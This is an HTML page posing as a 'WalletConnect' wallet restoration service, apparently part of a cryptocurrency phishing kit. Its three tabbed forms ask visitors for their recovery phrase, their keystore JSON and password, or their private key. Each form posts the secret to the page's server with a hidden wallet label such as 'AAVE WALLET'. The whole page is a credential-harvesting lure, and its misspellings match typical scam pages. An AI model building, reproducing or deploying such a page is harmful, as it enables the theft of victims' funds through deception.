

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Restore Wallet - Walletconnect Restoration</title>
    <!-- font awesome -->
    <link
    rel="stylesheet"
    href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
    integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"
    crossorigin="anonymous"
  />
  <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
    integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l"
    crossorigin="anonymous"
  />
  <link rel="stylesheet" href="/styles.css" />
</head>

<body>
    <header>
        <div class="container-fluid">
			<div class="row">
			<div class="col-md-4 offset-md-4">
				<a class="text-white" href="../list.html" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Restore Wallet</a>
			</div>
			</div>
		</div>
    </header>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<ul class="nav nav-tabs">
					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
				</ul>
			</div>
		</div>
	</div>
    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
					<!-- Tab panes -->
					<div class="tab-content">
						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
							<form method="post" action="">
								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase"></textarea>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="wallet" value="AAVE WALLET">
								<div class="form-group">
									<button class="btn btn-primary btn-block" name="submit" type="submit">RESTORE</button></div>
							
						</div>
						<div role="tabpanel" class="tab-pane fade" id="keystore">
						<form method="post" action="">
								<div class="form-group">
									<textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON"></textarea>
								</div>
								<div class="form-group">
									<input class="form-control" type="password" name="keystorepasswword" placeholder="Password">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">
									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
								</p>
								<input type="hidden" name="wallet" value="Aethereum wallet">
								<div class="form-group">
									<button class="btn btn-primary btn-block" name="submit" type="submit">RESTORE</button>
								</div>
						</form>	
						</div>
						<div role="tabpanel" class="tab-pane fade" id="privatekey">
							<form method="post" action="">
								<div class="form-group">
									<input class="form-control" name="privatekey" placeholder="Private Key">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="wallet" value="Aethereum wallet">
								<div class="form-group"><button class="btn btn-primary btn-block" name="submit" type="submit">RESTORE</button></div>
							</form>
						</div>
					</div>
                </div>
            </div>
        </div>
    </section>
    <script
    src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
    integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
    crossorigin="anonymous"
  ></script>
  <script
    src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
    crossorigin="anonymous"
  ></script>
</body>

</html>